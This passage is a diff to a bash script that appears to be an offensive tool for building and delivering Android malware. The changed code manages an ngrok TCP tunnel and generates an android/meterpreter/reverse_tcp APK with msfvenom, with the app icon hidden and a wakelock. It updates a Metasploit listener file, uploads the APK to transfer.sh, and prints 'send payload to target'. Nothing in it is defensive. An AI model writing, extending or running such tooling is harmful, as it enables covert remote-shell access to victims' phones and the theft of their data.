@@ -6,8 +6,9 @@
 
 ####
 
-config_file='config/metasploit_string.rb'
-settings_file=config/settings.conf
+ngrok_pid=$(pgrep ngrok)
+config_file="config/metasploit_string.rc"
+settings_file="config/settings.conf"
 source $settings_file
 # template='app/timberman.apk'
 # appname="Timberman"
@@ -18,9 +19,30 @@ banner(){
    cat config/banner.txt 
 }
 
+stop_ngrok(){
+
+   printf "[*] Stopping ngrok (kill -9 $ngrok_pid) in 5s...\n"
+   sleep 5
+   #  kill -9 $(ps -ef | grep 'ngrok' | grep -v 'grep' | awk '{print $2}')
+   kill -9 $ngrok_pid
+   printf "[i] Done!\n"
+
+}
+
 start_ngrok(){
 
-printf "[*] Starting ngrok...\n"
+#CHECK AND KILL NGROK IF ITS ALREADY RUNNING
+
+if [ -z $ngrok_pid ]; then
+    echo "[i] Ngrok is not running!"
+else
+    echo "[!] Ngrok is already running, killing it!"
+    stop_ngrok
+fi
+
+
+# START NGROK & EXCLUDE URL AND PORT TO VARIABLE
+printf "[*] Starting ngrok at port: $local_port...\n"
 ngrok tcp $local_port > /dev/null &
 while ! nc -z localhost 4040; do
   printf "[*] Waiting for ngrok url...\n"
@@ -38,7 +60,7 @@ fi
 NGROK_REMOTE_HOSTNAME="$(printf $NGROK_REMOTE_URL | awk -F "//" '{print $2}' | awk -F ":" '{print $1}')"
 NGROK_REMOTE_PORT="$(printf $NGROK_REMOTE_URL | awk -F ":" '{print $3}')"
 
-printf "[*] Ngrok remote hostname '$NGROK_REMOTE_URL'\n"
+printf "[i] Ngrok remote url '$NGROK_REMOTE_URL'\n"
 # printf "[*] HOSTNAME: $NGROK_REMOTE_HOSTNAME\n"
 # printf "[*] PORT: $NGROK_REMOTE_PORT\n"
 
@@ -75,7 +97,7 @@ default_app_template(){
    printf "\n[i] Current default app template = $template\n"
     read -p "[*] New value: " input
     empty_input
-    sed -i "s/template\=.*/template=$input/" $settings_file
+    sed -i "s!template\=.*!template=$input!" $settings_file
     source $settings_file
     settings
 }
@@ -93,7 +115,7 @@ default_exe_template(){
    printf "\n[i] Current default exe template = $exetemplate\n"
     read -p "[*] New value: " input
     empty_input
-    sed -i "s/exetemplate\=.*/exetemplate=$input/" $settings_file
+    sed -i "s!exetemplate\=.*!exetemplate=$input!" $settings_file
     source $settings_file
     settings
 }
@@ -122,27 +144,18 @@ case $sel in
 esac
 }
 
-stop_ngrok(){
-
-    printf "[*] Stopping ngrok in 5s...\n"
-    sleep 5
-    kill -9 $(ps -ef | grep 'ngrok' | grep -v 'grep' | awk '{print $2}')
-    printf "[i] Done!\n"
-
-}
-
 start_android(){
 
    payload="android/meterpreter/reverse_tcp"
 
    banner
-   printf "[*] Starting ngrok at port: $local_port...\n"
    start_ngrok
    printf "[*] Generating .apk payload...\n"
-   msfvenom --platform android -p android/meterpreter/reverse_tcp -x $template AndroidHideAppIcon=true AndroidWakelock=true LHOST=$NGROK_REMOTE_HOSTNAME LPORT=$NGROK_REMOTE_PORT > $appname.apk  
-   sed -i "s/PAYLOAD\ .*/PAYLOAD $payload/" $config_file > /dev/null &
-   sed -i "s/LPORT\ .*/LPORT $local_port/" $config_file  > /dev/null &
-   source $config_file
+   msfvenom --platform android -p android/meterpreter/reverse_tcp AndroidHideAppIcon=true AndroidWakelock=true LHOST=$NGROK_REMOTE_HOSTNAME LPORT=$NGROK_REMOTE_PORT > $appname.apk  
+   # printf "[*] Using apktool for payload in-app injection...\n"
+   printf "[*] Updating metasploit cmd file...\n"
+   sed -i "s!PAYLOAD\ .*!PAYLOAD $payload!" $config_file
+   sed -i "s/LPORT\ .*/LPORT $local_port/" $config_file
    printf "[*] Generating share link...\n\n"
    curl --upload-file ./$appname.apk https://transfer.sh/$appname.apk
    printf "\n\n[*] Done, send payload to target\n"
